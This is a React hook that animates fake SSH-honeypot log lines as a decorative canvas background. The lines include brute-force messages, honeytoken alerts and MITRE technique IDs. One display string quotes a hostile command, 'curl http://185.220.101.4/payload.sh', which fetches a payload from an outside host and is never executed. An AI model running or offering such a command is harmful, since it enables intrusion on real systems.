import { useEffect } from 'react'

// ── Colour channels ────────────────────────────────────────────────────────
const GREEN = [118, 170, 131]
const AMBER = [255, 176, 0]

// ── Log line pool ──────────────────────────────────────────────────────────
// Realistic MIRAGEPOT / SSH-honeypot vocabulary.
// 'normal' = accent-green dim  |  'alert' = accent-green brighter  |  'token' = amber
const TEMPLATES = [
  { text: 'Connection from 185.220.101.4:52841 — ACCEPT',      kind: 'normal' },
  { text: 'Failed password for root from 185.220.101.4 ssh2',  kind: 'normal' },
  { text: 'MITRE T1110.001 — Brute Force: Password Guessing',  kind: 'alert'  },
  { text: 'HONEYTOKEN triggered: .bash_history accessed',       kind: 'token'  },
  { text: 'TARPIT active — 45ms/byte delay applied',            kind: 'alert'  },
  { text: "Ollama cmd_engine: 'uname -a' → LLM response",      kind: 'normal' },
  { text: 'Session #4821 terminated — 23 commands logged',     kind: 'normal' },
  { text: 'Prompt injection [pattern #31] — BLOCKED',           kind: 'alert'  },
  { text: 'Virtual FS: /etc/passwd read attempt',               kind: 'token'  },
  { text: 'T1059.004 — Unix Shell execution detected',          kind: 'alert'  },
  { text: 'Rate limit: 12 auth attempts in 3s',                 kind: 'normal' },
  { text: 'Connection from 194.165.16.77:41293 — ACCEPT',      kind: 'normal' },
  { text: 'Invalid user admin from 46.101.210.122 port 39244', kind: 'normal' },
  { text: 'HONEYTOKEN: /root/.ssh/authorized_keys read',        kind: 'token'  },
  { text: 'Session exfil: curl http://185.220.101.4/payload.sh',kind: 'alert' },
  { text: 'Grafana alert: auth_failures_total > 500/min',       kind: 'normal' },
  { text: "Static cache hit: cmd='ls -la'",                     kind: 'normal' },
  { text: 'T1078 — Valid Account probe detected',               kind: 'alert'  },
  { text: 'Connection from 91.92.249.45:38291 — TARPITTING',   kind: 'alert'  },
  { text: 'HONEYTOKEN: /proc/version accessed',                 kind: 'token'  },
  { text: 'LLM fallback: generating deceptive response',        kind: 'normal' },
  { text: 'Session #4822 terminated: idle timeout 30s',         kind: 'normal' },
  { text: 'Prometheus: active_sessions=847',                    kind: 'normal' },
  { text: 'pytest: 566 passed, 0 failed in 4.21s',              kind: 'normal' },
  { text: 'FS handler: /home/ubuntu/.bashrc served',            kind: 'normal' },
  { text: 'HONEYTOKEN: SSH private key access attempt',         kind: 'token'  },
  { text: 'T1021.004 — Remote Services: SSH detected',          kind: 'alert'  },
  { text: 'Connection from 198.199.10.1:44821 — ACCEPT',       kind: 'normal' },
]

// Generate a realistic-looking timestamp
function makeTs() {
  const p = n => String(n).padStart(2, '0')
  return `[${p(Math.floor(Math.random() * 24))}:${p(Math.floor(Math.random() * 60))}:${p(Math.floor(Math.random() * 60))}]`
}

function randTpl() {
  return TEMPLATES[Math.floor(Math.random() * TEMPLATES.length)]
}

// ── Hook ───────────────────────────────────────────────────────────────────
export function useHoneypotCanvas(canvasRef) {
  useEffect(() => {
    const canvas = canvasRef.current
    if (!canvas) return

    // Don't animate for users who prefer reduced motion
    if (window.matchMedia('(prefers-reduced-motion: reduce)').matches) return

    const ctx = canvas.getContext('2d')

    const FS    = 10.5  // font size
    const LH    = 19    // line height
    const SPEED = 0.28  // px per frame
    const PAD   = 44    // left padding per column

    // Each line: { text, kind, y, col }
    let lines = []
    let raf   = null
    let W = 0, H = 0

    const rgba = (rgb, a) =>
      `rgba(${rgb[0]},${rgb[1]},${rgb[2]},${Math.max(0, a).toFixed(3)})`

    function lineColor(kind, op) {
      if (kind === 'token') return rgba(AMBER, op * 1.8)
      if (kind === 'alert') return rgba(GREEN, op * 1.35)
      return rgba(GREEN, op)
    }

    // Seed both columns with lines spread across the visible area
    function seed() {
      lines = []
      const perCol = Math.ceil(H / LH) + 4
      for (let col = 0; col < 2; col++) {
        for (let i = 0; i < perCol; i++) {
          const t = randTpl()
          lines.push({ text: `${makeTs()} ${t.text}`, kind: t.kind, y: i * LH, col })
        }
      }
    }

    function resize() {
      const p = canvas.parentElement
      W = p ? p.clientWidth  : window.innerWidth
      H = p ? p.clientHeight : window.innerHeight
      canvas.width  = W
      canvas.height = H
      seed()
    }

    function frame() {
      // ── Advance all lines upward ───────────────────────────────────────
      for (const ln of lines) ln.y -= SPEED

      // ── Recycle lines that scrolled off the top ────────────────────────
      for (const ln of lines) {
        if (ln.y < -LH) {
          const t = randTpl()
          ln.text = `${makeTs()} ${t.text}`
          ln.kind = t.kind
          // Place below the bottommost line in the same column
          const colLines = lines.filter(l => l.col === ln.col)
          const maxY = Math.max(...colLines.map(l => l.y))
          ln.y = maxY + LH
        }
      }

      // ── Draw ───────────────────────────────────────────────────────────
      ctx.clearRect(0, 0, W, H)
      ctx.font = `${FS}px 'JetBrains Mono', monospace`
      ctx.textBaseline = 'top'

      const halfW = W / 2

      for (const ln of lines) {
        if (ln.y < -LH || ln.y > H + LH) continue

        // Opacity: flat in the middle, fades top 40 %, fades bottom 12 %
        let op = 0.07
        if (ln.y < H * 0.40) op = 0.07 * (ln.y / (H * 0.40))
        if (ln.y > H * 0.88) op = 0.07 * ((H - ln.y) / (H * 0.12))
        if (op < 0.003) continue

        ctx.fillStyle = lineColor(ln.kind, op)

        const x    = ln.col === 0 ? PAD : halfW + PAD / 2
        const maxW = halfW - PAD * 1.6

        let txt = ln.text
        while (ctx.measureText(txt).width > maxW && txt.length > 8) {
          txt = txt.slice(0, -4) + '…'
        }
        ctx.fillText(txt, x, Math.round(ln.y))
      }

      raf = requestAnimationFrame(frame)
    }

    // Pause when the tab is hidden to save CPU
    function onVisibility() {
      if (document.hidden) cancelAnimationFrame(raf)
      else raf = requestAnimationFrame(frame)
    }

    const ro = new ResizeObserver(resize)
    ro.observe(canvas.parentElement ?? document.body)
    resize()
    raf = requestAnimationFrame(frame)
    document.addEventListener('visibilitychange', onVisibility)

    return () => {
      cancelAnimationFrame(raf)
      ro.disconnect()
      document.removeEventListener('visibilitychange', onVisibility)
    }
  }, []) // eslint-disable-line react-hooks/exhaustive-deps
}
